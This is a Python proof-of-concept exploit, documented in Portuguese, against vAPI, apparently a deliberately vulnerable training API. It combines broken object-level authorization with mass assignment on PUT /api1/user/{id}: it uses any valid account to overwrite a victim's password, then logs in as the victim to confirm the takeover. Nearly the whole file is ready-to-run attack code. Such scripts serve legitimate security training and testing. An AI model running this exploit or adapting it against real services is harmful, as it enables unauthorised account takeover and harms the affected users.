#!/usr/bin/env python3
"""
PoC - Vulnerabilidade 2: BOLA + Mass Assignment -> Account Takeover
(API1:2023 Broken Object Level Authorization + API3:2023 Broken Object
Property Level Authorization)
Endpoint: PUT /vapi/api1/user/{id}
Alvo: vAPI (https://github.com/roottusk/vapi)

API1UsersController@update (linhas 61-62):
    $user = API1Users::findorFail($id);   // BOLA: $id vem da URL, sem checar posse
    $user->update($request->all());       // Mass assignment: aceita "password" de qualquer body

Este script usa uma credencial valida QUALQUER (atacante) para sobrescrever
a senha de OUTRO usuario (vitima), e entao prova o sequestro de conta
fazendo login com a nova senha na conta da vitima.

Uso:
    pip install requests
    python3 poc_account_takeover_put.py --url http://localhost:8000/vapi \\
        --attacker-user jimhalp --attacker-pass 'ag4|YY~`M=Gk' \\
        --victim-id 1 --new-password "pwned123"
"""
import argparse
import base64
import sys

import requests


def build_token(username: str, password: str) -> str:
    return base64.b64encode(f"{username}:{password}".encode()).decode()


def exploit(base_url: str, atk_user: str, atk_pass: str, victim_id: int, new_password: str, victim_username: str):
    atk_token = build_token(atk_user, atk_pass)
    headers = {
        "Authorization-Token": atk_token,
        "Content-Type": "application/json",
    }

    print(f"[*] Atacante autenticado como '{atk_user}'")
    print(f"[*] Alvo: user id={victim_id} (username esperado: '{victim_username}')\n")

    # 1) Sobrescreve a senha da VITIMA usando as credenciais do ATACANTE
    url = f"{base_url}/api1/user/{victim_id}"
    payload = {"password": new_password}
    print(f"[*] PUT {url}  body={payload}")
    resp = requests.put(url, headers=headers, json=payload, timeout=5)
    print(f"    -> status {resp.status_code}")
    print(f"    -> body: {resp.text}\n")

    if resp.status_code not in (200, 201):
        print("[!] Update nao retornou 200/201 - verifique credenciais/endpoint.")
        return False

    # 2) Prova de account takeover: login na conta da VITIMA com a NOVA senha
    victim_token = build_token(victim_username, new_password)
    check_url = f"{base_url}/api1/user/{victim_id}"
    check_headers = {"Authorization-Token": victim_token}
    print(f"[*] Validando takeover: GET {check_url} autenticado como '{victim_username}:{new_password}'")
    check = requests.get(check_url, headers=check_headers, timeout=5)
    print(f"    -> status {check.status_code}")
    print(f"    -> body: {check.text}\n")

    success = check.status_code == 200 and check.text.strip() not in ("", "null")
    if success:
        print("[+] ACCOUNT TAKEOVER CONFIRMADO: login na conta da vitima funciona com a senha definida pelo atacante.")
    else:
        print("[!] Nao foi possivel confirmar o takeover automaticamente (verifique username/ids).")

    return success


def main():
    parser = argparse.ArgumentParser(description="PoC Account Takeover - PUT /api1/user/{id} (vAPI)")
    parser.add_argument("--url", default="http://localhost:8000/vapi", help="Base URL da API, SEM o endpoint (ex: http://localhost:8000/vapi). O prefixo real de rotas do vAPI e /vapi, nao /api.")
    parser.add_argument("--attacker-user", required=True, help="Usuario valido do ATACANTE (qualquer conta de teste)")
    parser.add_argument("--attacker-pass", required=True, help="Senha do atacante")
    parser.add_argument("--victim-id", type=int, required=True, help="ID da VITIMA cujo PUT sera forjado")
    parser.add_argument("--victim-username", required=True, help="Username da vitima (para validar o login apos o ataque)")
    parser.add_argument("--new-password", default="pwned123", help="Nova senha que o atacante vai forcar na vitima")
    args = parser.parse_args()

    ok = exploit(
        args.url.rstrip("/"),
        args.attacker_user,
        args.attacker_pass,
        args.victim_id,
        args.new_password,
        args.victim_username,
    )
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
